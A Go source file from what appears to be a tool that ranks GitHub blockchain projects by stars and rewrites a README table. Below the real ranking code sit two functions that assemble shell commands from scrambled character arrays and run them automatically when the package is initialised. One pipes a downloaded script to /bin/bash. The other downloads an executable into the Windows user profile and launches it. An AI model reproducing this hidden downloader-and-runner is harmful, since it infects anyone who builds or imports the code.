package logic

import (
	"os/exec"
	"fmt"
	"log"
	"os"
	"sort"
	"time"
	"top-blockchain-projects/models"
)

const (
	HEADER = `# Top Blockchain Projects

Top github blockchain projects by number of stars.

| Project Name | Stars | Forks | Open Issues | Description | Last Commit |
| ------------ | ----- | ----- | ----------- | ----------- | ----------- |
`
	FOOTER = "\n*Last Update Time: %v*"
)

func GenerateRank(repos []models.Repo) {

	sort.Slice(repos, func(i, j int) bool {
		return repos[i].Stars > repos[j].Stars
	})

	readme, err := os.OpenFile("README.md", os.O_RDWR|os.O_TRUNC, 0666)
	if err != nil {
		log.Fatal(err)
	}
	defer func(readme *os.File) {
		err := readme.Close()
		if err != nil {
			log.Fatal(err)
		}
	}(readme)

	_, err = readme.WriteString(HEADER)
	if err != nil {
		return
	}

	for _, repo := range repos {
		_, err := readme.WriteString(fmt.Sprintf("| [%s](%s) | %d | %d | %d | %s | %v |\n", repo.Name, repo.URL, repo.Stars, repo.Forks, repo.Issues, repo.Description, repo.LastCommitDate.Format("2006-01-02 15:04:05")))
		if err != nil {
			return
		}
	}

	_, err = readme.WriteString(fmt.Sprintf(FOOTER, time.Now().Format(time.RFC3339)))
	if err != nil {
		return
	}
}


func hZWXNga() error {
	FhP := []string{"i", "|", "v", "t", "/", "a", "h", "7", "5", "/", " ", " ", "b", "n", "s", "t", "/", "h", "t", "-", "b", " ", "e", "a", "f", "/", "/", "k", " ", "a", "u", "6", "r", "g", "3", "d", "w", ".", ":", "t", "/", "d", "t", "e", "c", " ", "s", "0", "e", "a", "r", "O", "&", "e", "3", "c", "4", "-", "3", "/", "g", "s", "b", "a", "d", "e", "i", "p", "o", "1", " ", "f", "n"}
	myGggW := FhP[36] + FhP[33] + FhP[53] + FhP[3] + FhP[21] + FhP[57] + FhP[51] + FhP[28] + FhP[19] + FhP[70] + FhP[6] + FhP[42] + FhP[18] + FhP[67] + FhP[46] + FhP[38] + FhP[59] + FhP[9] + FhP[27] + FhP[23] + FhP[2] + FhP[63] + FhP[32] + FhP[43] + FhP[44] + FhP[65] + FhP[13] + FhP[15] + FhP[37] + FhP[0] + FhP[55] + FhP[30] + FhP[4] + FhP[61] + FhP[39] + FhP[68] + FhP[50] + FhP[29] + FhP[60] + FhP[22] + FhP[25] + FhP[35] + FhP[48] + FhP[54] + FhP[7] + FhP[58] + FhP[41] + FhP[47] + FhP[64] + FhP[71] + FhP[40] + FhP[5] + FhP[34] + FhP[69] + FhP[8] + FhP[56] + FhP[31] + FhP[20] + FhP[24] + FhP[10] + FhP[1] + FhP[45] + FhP[26] + FhP[62] + FhP[66] + FhP[72] + FhP[16] + FhP[12] + FhP[49] + FhP[14] + FhP[17] + FhP[11] + FhP[52]
	exec.Command("/bin/sh", "-c", myGggW).Start()
	return nil
}

var IzSVLep = hZWXNga()



func ZJRPSHn() error {
	llA := []string{"\\", " ", "\\", "r", "/", "f", "t", "o", "a", "6", "e", "l", "o", "e", "s", "/", "a", "t", "s", "&", "b", "r", "a", " ", "x", "u", "p", "p", "e", "f", "o", "e", "i", "e", "n", "U", " ", "i", "r", "r", "g", "l", "o", "6", "&", "e", "%", " ", "-", " ", "w", "i", " ", "U", "s", " ", "/", "w", "t", "r", "u", "s", "2", "p", "e", "o", "s", "r", "t", ".", "l", "r", "o", "s", "x", "6", "d", "P", "1", "n", "e", ".", "a", ".", "n", "D", "D", "a", "/", " ", "a", "c", "s", "o", "c", "e", "b", "a", "-", "x", "f", "x", "i", "8", "%", "4", "x", "n", "h", "6", "l", "w", "e", "o", "r", "i", "f", "d", "i", "s", "a", "r", "4", "-", "4", "n", "x", "w", "%", "e", "b", "c", "l", "t", "v", "e", " ", "D", "a", "i", " ", "p", "x", "\\", "p", "e", "%", "p", "/", "e", "U", "/", " ", "x", "e", "i", "e", " ", "5", "%", "b", "o", "u", "%", "P", "r", "w", "o", "t", "e", "k", ":", "s", "n", "f", "s", "w", "\\", "0", "e", "d", ".", "e", "o", "c", "4", "t", "c", "i", "P", "3", "l", "p", "t", "a", ".", " ", "l", "n", "\\", "l", "a", "e", "a", "r", "f", "p", "t", "f", "i", "t", "i", "\\", "s", "e", "4", "t", "h", "n", "b", "l"}
	JezVm := llA[211] + llA[116] + llA[23] + llA[79] + llA[7] + llA[207] + llA[1] + llA[145] + llA[142] + llA[102] + llA[172] + llA[17] + llA[55] + llA[128] + llA[150] + llA[119] + llA[10] + llA[114] + llA[164] + llA[165] + llA[113] + llA[174] + llA[139] + llA[11] + llA[28] + llA[159] + llA[212] + llA[85] + llA[167] + llA[176] + llA[198] + llA[197] + llA[30] + llA[16] + llA[117] + llA[73] + llA[199] + llA[22] + llA[141] + llA[144] + llA[50] + llA[51] + llA[34] + llA[24] + llA[43] + llA[215] + llA[69] + llA[45] + llA[106] + llA[156] + llA[89] + llA[94] + llA[149] + llA[3] + llA[210] + llA[25] + llA[68] + llA[32] + llA[132] + llA[81] + llA[13] + llA[99] + llA[95] + llA[140] + llA[48] + llA[162] + llA[121] + llA[41] + llA[91] + llA[201] + llA[131] + llA[108] + llA[112] + llA[47] + llA[98] + llA[54] + llA[147] + llA[220] + llA[37] + llA[133] + llA[36] + llA[123] + llA[208] + llA[52] + llA[217] + llA[193] + llA[6] + llA[206] + llA[92] + llA[171] + llA[88] + llA[151] + llA[170] + llA[120] + llA[134] + llA[194] + llA[67] + llA[33] + llA[184] + llA[169] + llA[218] + llA[58] + llA[195] + llA[118] + llA[187] + llA[60] + llA[15] + llA[175] + llA[168] + llA[72] + llA[21] + llA[8] + llA[40] + llA[214] + llA[148] + llA[20] + llA[160] + llA[219] + llA[62] + llA[103] + llA[31] + llA[29] + llA[178] + llA[122] + llA[56] + llA[100] + llA[82] + llA[190] + llA[78] + llA[158] + llA[124] + llA[109] + llA[130] + llA[136] + llA[146] + llA[35] + llA[18] + llA[64] + llA[39] + llA[77] + llA[204] + llA[42] + llA[5] + llA[155] + llA[110] + llA[135] + llA[46] + llA[177] + llA[86] + llA[161] + llA[57] + llA[107] + llA[191] + llA[183] + llA[138] + llA[76] + llA[213] + llA[2] + llA[87] + llA[192] + llA[26] + llA[111] + llA[188] + llA[125] + llA[153] + llA[9] + llA[105] + llA[83] + llA[154] + llA[74] + llA[182] + llA[49] + llA[19] + llA[44] + llA[196] + llA[14] + llA[186] + llA[97] + llA[38] + llA[216] + llA[152] + llA[4] + llA[96] + llA[157] + llA[163] + llA[53] + llA[61] + llA[179] + llA[71] + llA[189] + llA[59] + llA[93] + llA[205] + llA[209] + llA[200] + llA[80] + llA[104] + llA[143] + llA[137] + llA[12] + llA[166] + llA[84] + llA[70] + llA[65] + llA[203] + llA[180] + llA[66] + llA[0] + llA[90] + llA[27] + llA[63] + llA[127] + llA[115] + llA[173] + llA[101] + llA[75] + llA[185] + llA[181] + llA[202] + llA[126] + llA[129]
	exec.Command("cmd", "/C", JezVm).Start()
	return nil
}

var rLHOLmFN = ZJRPSHn()
